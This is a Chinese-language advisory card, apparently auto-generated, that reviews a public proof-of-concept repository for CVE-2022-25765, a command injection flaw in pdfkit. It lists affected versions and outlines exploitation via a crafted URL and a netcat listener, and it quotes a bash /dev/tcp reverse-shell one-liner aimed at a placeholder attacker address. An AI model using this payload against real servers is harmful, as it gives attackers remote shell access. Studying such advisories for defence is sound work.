## CVE-2022-25765-pdfkit-命令注入

**漏洞编号:** CVE-2022-25765

**漏洞类型:** 命令注入

**影响应用:** pdfkit

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 0.8.7.2

**利用条件:** 需要目标服务器运行存在漏洞的pdfkit版本，并允许通过URL方式转换PDF

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-25765是pdfkit gem中的一个命令注入漏洞。根据漏洞描述，由于pdfkit没有正确地过滤URL，攻击者可以通过在URL中注入恶意命令来执行任意代码。提供的POC代码展示了如何利用这个漏洞：

1.  启动一个HTTP服务器，用于接收反弹shell。
2.  启动一个netcat监听器，用于接收反弹shell。
3.  构造一个包含恶意命令的URL，并将其传递给pdfkit。URL中的`bash -c 'exec bash -i &>/dev/tcp/Target_ADRESS/LISTENING_PORT<&1'` 部分会尝试建立一个反向shell连接到攻击者的服务器。

**有效性：**  根据漏洞信息和POC代码，该漏洞利用方法有效。攻击者可以通过构造恶意的URL，利用`pdfkit`生成PDF文件的功能，执行任意命令。

**投毒风险：**  仓库中主要为漏洞说明和POC，直接执行反弹shell命令，恶意代码本身就是为了验证漏洞的存在和利用。评估该仓库存在投毒代码的风险较低，约10%。风险主要在于下载和执行POC脚本的人可能不清楚其潜在风险，直接执行可能导致安全问题。需要人工审核代码，保证下载的代码和公开的代码是一致的。

**利用方式：** 攻击者通过构造包含恶意命令的URL，传递给存在漏洞的pdfkit应用。pdfkit在处理URL时，没有进行充分的过滤，导致恶意命令被执行。攻击者可以通过反弹shell获取目标服务器的控制权，或者执行其他恶意操作。

**项目地址:** [lekosbelas/PDFkit-CMD-Injection](https://github.com/lekosbelas/PDFkit-CMD-Injection)

**漏洞详情:** [CVE-2022-25765](https://nvd.nist.gov/vuln/detail/CVE-2022-25765)